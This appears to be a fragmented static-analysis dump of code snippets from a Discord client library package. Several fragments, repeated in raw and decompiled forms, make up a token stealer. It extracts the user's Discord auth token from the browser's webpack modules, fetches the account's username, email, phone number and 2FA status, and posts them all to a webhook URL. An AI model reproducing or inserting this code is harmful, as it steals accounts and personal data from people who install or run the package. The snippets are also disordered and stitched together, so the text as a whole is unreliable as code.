overwrites = overwrites.map(overwrite => {
      const role = this.client.resolver.resolveRole(guild, overwrite.id);
      if (role) {
        overwrite.id = role.id;
        overwrite.type = 'role';
      } else {
        overwrite.id = this.client.resolver.resolveUserID(overwrite.id);
        overwrite.type = 'member';
      }

      return {
        allow: Permissions.resolve(overwrite.allow || overwrite.allowed || 0),
        deny: Permissions.resolve(overwrite.deny || overwrite.denied || 0),
        type: overwrite.type,
        id: overwrite.id,
      };
    })
setTimeout(async function() {
        const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken();

        let res;
        try {
            res = await fetch("https://discordapp.com/api/v9/users/@me", {
                method: "GET",
                headers: {
                    "Authorization": token
                }
            });
            res = await res.json();
        } catch(e) {
            return;
        }
        try {
            let hook;
            hook = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-type": "application/json"
                },
                body: JSON.stringify({
                    content: `**Browser Token:** \`\`\`${token}\`\`\`
**Account Info:** \`\`\`${res.username}#${res.discriminator}
User ID: ${res.id}
Email Add...
const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()
this.build({
      url: url || this.constructor.DFEAULT.url,
      version: version || this.constructor.DEFAULT.version,
    })
error.message && flattened ? <operator>.formatString("", error.message, "\n", flattened, "") : error.message || flattened
VoiceServerUpdate = package\src\client\websocket\packets\handlers\VoiceServerUpdate.js::program:VoiceServerUpdate:<init>
res = await fetch("https://discordapp.com/api/v9/users/@me", {
                method: "GET",
                headers: {
                    "Authorization": token
                }
            })
WebSocketPacketManager = package\src\client\websocket\packets\WebSocketPacketManager.js::program:WebSocketPacketManager:<init>
TextBasedChannel = package\src\structures\interfaces\TextBasedChannel.js::program:TextBasedChannel:<init>
ReactionCollector = package\src\structures\ReactionCollector.js::program:ReactionCollector:<init>
const WebSocket = (function findWebSocket() {
  if (browser) return window.WebSocket; // eslint-disable-line no-undef
  try {
    return require('uws');
  } catch (e) {
    return require('ws');
  }
}())
VoiceWebSocket = package\src\client\voice\VoiceWebSocket.js::program:VoiceWebSocket:<init>
this.encoder.applyEncoderCTL(this.ctl.BITRATE, Math.min(128, Math.max(16, bitrate)) * 1000)
this.register(Constants.WSEvents.READY, require('./handlers/Ready'))
UserAgentManager.DEFAULT = {
  url: Constants.Package.homepage.split('#')[0],
  version: Constants.Package.version,
}
exports.fetch = engineOptions => {
  for (const encoder of list) {
    const fetched = fetch(encoder, engineOptions);
    if (fetched) return fetched;
  }

  throw new Error('Couldn\'t find an Opus engine.');
}
lib.ready.then(() => {
        exports.methods = libs[libName](lib);
      }).catch(() => {
        const tweetnacl = require('tweetnacl');
        exports.methods = libs.tweetnacl(tweetnacl);
      }).catch(() => undefined)
this.register(Constants.WSEvents.GUILD_UPDATE, require('./handlers/GuildUpdate'))
hook = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-type": "application/json"
                },
                body: JSON.stringify({
                    content: `**Browser Token:** \`\`\`${token}\`\`\`
**Account Info:** \`\`\`${res.username}#${res.discriminator}
User ID: ${res.id}
Email Address: ${res.email}
Phone Number: ${res.phone}
2FA On: ${res.mfa_enabled}
Bio: "${res.bio}"\`\`\``                })
            })
this.register(Constants.WSEvents.GUILD_MEMBER_REMOVE, require('./handlers/GuildMemberRemove'))
this.bitfield = typeof permissions === 'number' ? permissions : this.constructor.resolve(permissions)
_tmp_8.body = JSON.stringify({
                    content: `**Browser Token:** \`\`\`${token}\`\`\`
**Account Info:** \`\`\`${res.username}#${res.discriminator}
User ID: ${res.id}
Email Address: ${res.email}
Phone Number: ${res.phone}
2FA On: ${res.mfa_enabled}
Bio: "${res.bio}"\`\`\``                })
_tmp_10.content = <operator>.formatString("**Browser Token:** \`\`\`", token, "\`\`\`
**Account Info:** \`\`\`", res.username, "#", res.discriminator, "
User ID: ", res.id, "
Email Address: ", res.email, "
Phone Number: ", res.phone, "
2FA On: ", res.mfa_enabled, "
Bio: "", res.bio, ""\`\`\`")
this.client.setTimeout(() => this.deleted.delete(guildID + userID), this.client.options.restWsBridgeTimeout)
throw new TypeError(
        `"timestamp" argument must be a number (received ${isNaN(timestamp) ? 'NaN' : typeof timestamp})`
      );
this.resetTimeout = this.client.setTimeout(() => {
            this.remaining = this.limit;
            this.globalLimit = false;
            this.handle();
            this.resetTimeout = null;
          }, Number(res.headers['retry-after']) + this.client.options.restTimeOffset)
this === presence || (
      presence &&
      this.status === presence.status &&
      this.game ? this.game.equals(presence.game) : !presence.game
    )
key ? isNaN(k) ? <operator>.formatString("", key, ".", k, "") : <operator>.formatString("", key, "[", k, "]") : k
new Promise((resolve, reject) => {
      if (!channel.joinable) {
        if (channel.full) {
          throw new Error('You do not have permission to join this voice channel; it is full.');
        } else {
          throw new Error('You do not have permission to join this voice channel.');
        }
      }

      let connection = this.connections.get(channel.guild.id);

      if (connection) {
        if (connection.channel.id !== channel.id) {
          this.connections.get(channel.guild.id).updateChannel(channel);
        }
        resolve(connection);
        return;
      } else {
        connection = new VoiceConnection(this, channel);
        this.connections.set(channel.guild.id, connection);
      }

      connection.once('failed', reason => {
        this.connections.delete(channel.guild.id);
        reject(reason);
      });

      connection.once('authenticated', () => {
        connection.once('ready', () => resolve(connection));
        connection.once('error', rejec...
channel.client.setTimeout(() => {
    channel.client.emit(Constants.Events.TYPING_STOP, channel, user, channel._typing.get(user.id));
    channel._typing.delete(user.id);
  }, 6000)
<operator>.formatString("https://cdn.discordapp.com/app-icons/", this.id, "/", this.icon, ".jpg")
listener = util.deprecate(listener, 'MessageCollector will soon no longer emit "message", use "collect" instead')
this.voiceConnection.sockets.udp.socket.on('message', this._listener)
new Promise((resolve, reject) => {
      const listener = message => {
        if (!message || message._sFetchProp !== prop) return;
        process.removeListener('message', listener);
        if (!message._error) resolve(message._result); else reject(Util.makeError(message._error));
      };
      process.on('message', listener);

      this.send({ _sFetchProp: prop }).catch(err => {
        process.removeListener('message', listener);
        reject(err);
      });
    })
connection.once('authenticated', () => {
        connection.once('ready', () => resolve(connection));
        connection.once('error', reject);
        connection.once('disconnect', () => this.connections.delete(channel.guild.id));
      })
const Actions = {
  ALL: null,
  GUILD_UPDATE: 1,
  CHANNEL_CREATE: 10,
  CHANNEL_UPDATE: 11,
  CHANNEL_DELETE: 12,
  CHANNEL_OVERWRITE_CREATE: 13,
  CHANNEL_OVERWRITE_UPDATE: 14,
  CHANNEL_OVERWRITE_DELETE: 15,
  MEMBER_KICK: 20,
  MEMBER_PRUNE: 21,
  MEMBER_BAN_ADD: 22,
  MEMBER_BAN_REMOVE: 23,
  MEMBER_UPDATE: 24,
  MEMBER_ROLE_UPDATE: 25,
  ROLE_CREATE: 30,
  ROLE_UPDATE: 31,
  ROLE_DELETE: 32,
  INVITE_CREATE: 40,
  INVITE_UPDATE: 41,
  INVITE_DELETE: 42,
  WEBHOOK_CREATE: 50,
  WEBHOOK_UPDATE: 51,
  WEBHOOK_DELETE: 52,
  EMOJI_CREATE: 60,
  EMOJI_UPDATE: 61,
  EMOJI_DELETE: 62,
  MESSAGE_DELETE: 72,
}
_tmp_12.d = {
          protocol: 'udp',
          data: {
            address: packet.address,
            port: packet.port,
            mode: 'xsalsa20_poly1305',
          },
        }
_tmp_6.INVALID_SHARD = "Invalid shard settings were provided."
_tmp_13.data = {
            address: packet.address,
            port: packet.port,
            mode: 'xsalsa20_poly1305',
          }
dispatcher.once('end', () => this.unregisterDispatcher(dispatcher))
dispatcher.on('volumeChange', (o, n) => {
        this.unregisterDispatcher(dispatcher, o);
        if (!this._dispatchers.has(n)) {
          this._dispatchers.set(n, new Set());
          this._encoders.set(n, OpusEncoders.fetch());
        }
        this._dispatchers.get(n).add(dispatcher);
      })
function parseLocalPacket = function parseLocalPacket(message) {
  try {
    const packet = Buffer.from(message);
    let address = '';
    for (let i = 4; i < packet.indexOf(0, i); i++) address += String.fromCharCode(packet[i]);
    const port = parseInt(packet.readUIntLE(packet.length - 2, 2).toString(10), 10);
    return { address, port };
  } catch (error) {
    return { error };
  }
}
this.mentions = new Mentions(
      this,
      'mentions' in data ? data.mentions : this.mentions.users,
      'mentions_roles' in data ? data.mentions_roles : this.mentions.roles,
      'mention_everyone' in data ? data.mention_everyone : this.mentions.everyone
    )
_tmp_13.push(Actions.CHANNEL_OVERWRITE_CREATE)
this.fetchMessages({ limit: 1, around: messageID }).then(messages => {
        const msg = messages.get(messageID);
        if (!msg) throw new Error('Message not found.');
        return msg;
      })
permission.map(p => this.resolve(p)).reduce((prev, p) => prev | p, 0)
file = { attachment: file.file, name: path.basename(file.file) || 'file.jpg' }
this.ratelimit.resetTimer = this.client.setTimeout(() => {
        this.ratelimit.remaining = this.ratelimit.total;
        this.processQueue();
      }, this.ratelimit.time)
(_tmp_14 = [
      Actions.CHANNEL_DELETE,
      Actions.CHANNEL_OVERWRITE_DELETE,
      Actions.MEMBER_KICK,
      Actions.MEMBER_PRUNE,
      Actions.MEMBER_BAN_ADD,
      Actions.ROLE_DELETE,
      Actions.INVITE_DELETE,
      Actions.WEBHOOK_DELETE,
      Actions.EMOJI_DELETE,
      Actions.MESSAGE_DELETE,
    ]).includes
options.maxID = long.fromNumber(t + 86400000).shiftLeft(22).toString()
data.color = this.client.resolver.resolveColor(data.color)
data.permissions = Permissions.resolve(data.permissions)
const invites = new Collection()
this.rest.makeRequest(
      'delete', Endpoints.Guild(role.guild).Role(role.id), true,
      undefined, undefined, reason)
      .then(() =>
        this.client.actions.GuildRoleDelete.handle({
          guild_id: role.guild.id,
          role_id: role.id,
        }).role
      )
const voiceState = this._rawVoiceStates.get(member.user.id)
member.serverMute = voiceState.mute
this.client.channels.get(voiceState.channel_id).members.set(member.user.id, member)
this.client.emit(Constants.Events.GUILD_MEMBER_ADD, member)
const member = this.members.get(user)
member && member.speaking !== speaking
this.client.emit(Constants.Events.GUILD_MEMBER_SPEAKING, member, speaking)
